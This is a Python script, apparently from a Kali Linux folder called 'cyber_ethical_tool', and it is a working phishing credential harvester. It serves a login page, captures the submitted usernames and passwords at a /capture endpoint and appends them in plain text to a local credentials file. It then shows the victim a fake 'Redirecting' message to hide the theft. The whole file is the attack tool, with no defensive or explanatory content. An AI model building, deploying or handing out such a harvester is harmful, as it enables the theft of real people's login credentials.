import http.server
import socketserver
from urllib.parse import parse_qs
import threading
import time

class LoginHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        # Serve the login page on GET request
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open('login.html', 'r') as f:
                self.wfile.write(f.read().encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        # Handle the form submission
        if self.path == '/capture':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)

            # Parse the POST data
            data = parse_qs(post_data.decode('utf-8'))

            username = data.get('username', [''])[0]
            password = data.get('password', [''])[0]

            CREDENTIALS_FILE = '/home/kali/Desktop/cyber_ethical_tool/credentials.txt'
            with open(CREDENTIALS_FILE, 'a') as f:
                f.write(f"Username: {username}\nPassword: {password}\n\n")

            # Respond with a simple login success message
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"Processing... Redirecting in 2 seconds.")
        else:
            self.send_response(404)
            self.end_headers()

# Function to run the server in a separate thread
def start_server():
    PORT = 9090
    with socketserver.TCPServer(("", PORT), LoginHandler) as httpd:
        httpd.allow_reuse_address = True
        print(f"Serving on port {PORT}")
        httpd.serve_forever()

# Start the server in a separate thread
def run_server():
    server_thread = threading.Thread(target=start_server)
    server_thread.daemon = True
    server_thread.start()

# Function to check the file for updated credentials
def read_credentials():
    try:
        with open('/home/kali/Desktop/cyber_ethical_tool/credentials.txt', 'r') as f:
            return f.read()
    except FileNotFoundError:
        return None

# Run the server
if __name__ == "__main__":
    start_server()
